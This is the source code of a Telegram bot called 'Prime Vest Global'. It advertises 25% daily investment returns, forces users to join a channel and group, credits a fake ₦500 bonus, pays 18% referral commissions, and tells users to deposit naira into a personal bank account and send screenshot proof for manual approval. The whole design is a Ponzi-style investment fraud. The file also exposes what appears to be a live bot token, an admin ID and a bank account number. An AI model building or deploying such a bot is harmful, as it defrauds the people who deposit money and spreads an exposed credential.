const { Telegraf, Markup } = require("telegraf");

// 🔴 CONFIG (EDIT THESE ONLY)
const bot = new Telegraf("8783194867:AAF4a8tAkN07v9t0o5ewB_CbRsZBDBNaKJw");
const ADMIN_ID = 7510750214;
const CHANNEL_USERNAME = "@starfordfreenumbers";
const GROUP_USERNAME = "@Primevestglobalinvestments";
const BOT_USERNAME = "primevestglobal_bot";

// 🧠 MEMORY
let users = {};
let waitingBank = {};
let pendingWithdrawals = {};
let pendingDeposits = {};
let waitingProof = {};
let recentWithdrawals = [];
let recentActivities = [];

// 👤 USER SYSTEM
function getUser(id) {
  if (!users[id]) {
    users[id] = {
      balance: 500,
      profit: 0,
      invested: 0,
      bank: null,
      joined: false,
      lastProfit: null,
      referrer: null
    };
  }
  return users[id];
}

// 🔒 FORCE JOIN
async function isJoined(ctx) {
  try {
    let ch = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    let gr = await ctx.telegram.getChatMember(GROUP_USERNAME, ctx.from.id);

    return (
      ["member","creator","administrator"].includes(ch.status) &&
      ["member","creator","administrator"].includes(gr.status)
    );
  } catch {
    return false;
  }
}

// 🔘 MENU
function mainMenu(userId) {
  let menu = [
    ["💼 Invest", "💰 Balance"],
    ["🏧 Withdraw", "💳 Deposit"],
    ["🏦 Add Bank", "👥 Referral"],
    ["📜 History", "📢 Activity"]
  ];

  if (userId == ADMIN_ID) {
    menu.push(["🛠 Admin Panel"]);
  }

  return Markup.keyboard(menu).resize();
}

function backBtn() {
  return Markup.keyboard([["⬅️ Back"]]).resize();
}

// 🚀 START
bot.start(async (ctx) => {
  const joined = await isJoined(ctx);

  if (!joined) {
    return ctx.reply(
`🚫 Please join to continue`,
      Markup.inlineKeyboard([
        [Markup.button.url("📢 Channel", `https://t.me/${CHANNEL_USERNAME.replace("@","")}`)],
        [Markup.button.url("💬 Group", `https://t.me/${GROUP_USERNAME.replace("@","")}`)],
        [Markup.button.callback("✅ CHECK", "check_join")]
      ])
    );
  }

  const userId = ctx.from.id;
  const ref = ctx.startPayload;
  let u = getUser(userId);

  if (!u.joined) {
    u.joined = true;

    recentActivities.unshift(`👤 New user joined`);
    if (recentActivities.length > 10) recentActivities.pop();

    // SAVE REFERRER ONLY (NO BONUS YET)
    if (ref && ref != userId) {
      u.referrer = ref;

      bot.telegram.sendMessage(userId,
`🎁 You joined via referral!

💰 Your sponsor earns 18% when you invest`);
    }
  }

  ctx.reply(
`🔥 PRIME VEST GLOBAL

💰 Earn 25% daily  
🎁 ₦500 bonus added  

👇 Choose option`,
    mainMenu(userId)
  );
});

// ✅ CHECK JOIN
bot.action("check_join", async (ctx) => {
  const joined = await isJoined(ctx);

  if (!joined) return ctx.answerCbQuery("❌ Join first!");

  ctx.answerCbQuery("✅ Verified!");
  ctx.reply("Access granted", mainMenu(ctx.from.id));
});

// 📊 INVEST MENU
bot.hears("💼 Invest", (ctx) => {
  ctx.reply("Choose investment:", Markup.keyboard([
    ["₦3000","₦5000"],
    ["₦10000","₦15000"],
    ["₦20000","₦25000"],
    ["₦40000","₦50000"],
    ["⬅️ Back"]
  ]).resize());
});

// 💳 DEPOSIT MENU
bot.hears("💳 Deposit", (ctx) => {
  ctx.reply("Choose deposit:", Markup.keyboard([
    ["₦3000","₦5000"],
    ["₦10000","₦15000"],
    ["₦20000","₦25000"],
    ["₦40000","₦50000"],
    ["⬅️ Back"]
  ]).resize());
});

// 📸 SCREENSHOT HANDLER
bot.on("photo", (ctx) => {
  const userId = ctx.from.id;

  if (waitingProof[userId]) {
    let amount = pendingDeposits[userId];
    let u = getUser(userId);

    const photo = ctx.message.photo.pop().file_id;

    bot.telegram.sendPhoto(ADMIN_ID, photo, {
      caption:
`💳 DEPOSIT PROOF

User: ${userId}
Amount: ₦${amount}

Bank:
${u.bank || "Not added"}

/confirm_${userId}`
    });

    waitingProof[userId] = false;

    return ctx.reply("Screenshot received. Waiting for approval...");
  }
});

// 🧠 MAIN HANDLER
bot.on("text", (ctx) => {
  const text = ctx.message.text.trim();
  const userId = ctx.from.id;
  let u = getUser(userId);

  if (text === "⬅️ Back") return ctx.reply("Menu", mainMenu(userId));

  if (text === "💰 Balance") {
    return ctx.reply(
`💰 Balance: ₦${u.balance}
📈 Profit: ₦${u.profit}
💼 Invested: ₦${u.invested}`,
      backBtn()
    );
  }

  if (text === "👥 Referral") {
    const link = `https://t.me/${BOT_USERNAME}?start=${userId}`;
    return ctx.reply(`Your link:\n${link}\nEarn 18%`, backBtn());
  }

  if (text === "📜 History") {
    let list = recentWithdrawals
      .map(w => `💸 ₦${w.amount} - ${w.time}`)
      .join("\n");

    return ctx.reply(
`Recent Withdrawals:

${list || "No withdrawals yet"}`,
      backBtn()
    );
  }

  if (text === "📢 Activity") {
    return ctx.reply(
`Live Activity:

${recentActivities.join("\n") || "No activity yet"}`,
      backBtn()
    );
  }

  if (text === "🏦 Add Bank") {
    waitingBank[userId] = true;
    return ctx.reply("Send Name / Bank / Account", backBtn());
  }

  if (waitingBank[userId]) {
    u.bank = text;
    delete waitingBank[userId];
    return ctx.reply("Bank saved", mainMenu(userId));
  }

  const plans = {
    "₦3000":3000,"₦5000":5000,"₦10000":10000,"₦15000":15000,
    "₦20000":20000,"₦25000":25000,"₦40000":40000,"₦50000":50000
  };

  if (plans[text]) {
    let amount = plans[text];

    if (u.balance >= amount) {
      u.balance -= amount;
      u.invested += amount;
      u.lastProfit = Date.now();

      // 🎁 REFERRAL BONUS ON INVEST
      if (u.referrer) {
        let refUser = getUser(u.referrer);
        let bonus = Math.floor(amount * 0.18);

        refUser.balance += bonus;

        bot.telegram.sendMessage(u.referrer,
`🎉 Referral Earnings

User invested ₦${amount}
You earned ₦${bonus}`);
      }

      let daily = amount * 0.25;
      let total = daily * 60;

      return ctx.reply(
`Investment successful

₦${amount}
Daily: ₦${daily}
Total: ₦${total}`,
        mainMenu(userId)
      );
    } else {
      pendingDeposits[userId] = amount;
      waitingProof[userId] = true;

      return ctx.reply(
`Deposit ₦${amount}

Bank: Moniepoint
Account: 5075903950
Name: Kamsi

Send screenshot`,
        backBtn()
      );
    }
  }

  if (text === "🏧 Withdraw") {
    if (!u.bank) return ctx.reply("Add bank first", backBtn());
    if (u.balance <= 0) return ctx.reply("No balance", backBtn());

    pendingWithdrawals[userId] = u.balance;

    bot.telegram.sendMessage(ADMIN_ID,
`WITHDRAW REQUEST

User: ${userId}
Amount: ₦${u.balance}

Bank:
${u.bank}

/paid_${userId}`
    );

    return ctx.reply("Waiting for approval...");
  }

  // ADMIN PANEL
  if (text === "🛠 Admin Panel" && userId == ADMIN_ID) {
    return ctx.reply("Admin Panel", Markup.keyboard([
      ["📊 All Users"],
      ["💳 Deposits"],
      ["🏧 Withdrawals"],
      ["📈 Stats"],
      ["⬅️ Back"]
    ]).resize());
  }

  if (text === "📊 All Users" && userId == ADMIN_ID) {
    return ctx.reply(Object.keys(users).join("\n") || "No users");
  }

  if (text === "💳 Deposits" && userId == ADMIN_ID) {
    return ctx.reply(Object.keys(pendingDeposits).join("\n") || "No deposits");
  }

  if (text === "🏧 Withdrawals" && userId == ADMIN_ID) {
    return ctx.reply(Object.keys(pendingWithdrawals).join("\n") || "No withdrawals");
  }

  if (text === "📈 Stats" && userId == ADMIN_ID) {
    return ctx.reply(`Total Users: ${Object.keys(users).length}`);
  }

  if (text.startsWith("/confirm_") && userId == ADMIN_ID) {
    let id = text.split("_")[1];
    let amount = pendingDeposits[id];

    if (amount) {
      getUser(id).balance += amount;
      delete pendingDeposits[id];

      bot.telegram.sendMessage(id, `Deposit confirmed`);
      return ctx.reply("Approved");
    }
  }

  if (text.startsWith("/paid_") && userId == ADMIN_ID) {
    let id = text.split("_")[1];
    let amount = pendingWithdrawals[id];

    if (amount) {
      let user = getUser(id);

      recentWithdrawals.unshift({
        amount: amount,
        time: new Date().toLocaleTimeString()
      });

      if (recentWithdrawals.length > 10) recentWithdrawals.pop();

      user.balance = 0;
      delete pendingWithdrawals[id];

      bot.telegram.sendMessage(id, `Withdrawal sent`);
      return ctx.reply("Paid");
    }
  }
});

// 💰 AUTO PROFIT
setInterval(() => {
  for (let id in users) {
    let u = users[id];

    if (u.invested > 0 && u.lastProfit) {
      if (Date.now() - u.lastProfit >= 86400000) {
        let profit = u.invested * 0.25;

        u.balance += profit;
        u.profit += profit;
        u.lastProfit = Date.now();

        bot.telegram.sendMessage(id, `Daily profit ₦${profit}`);
      }
    }
  }
}, 60000);

bot.launch();
console.log("BOT RUNNING");
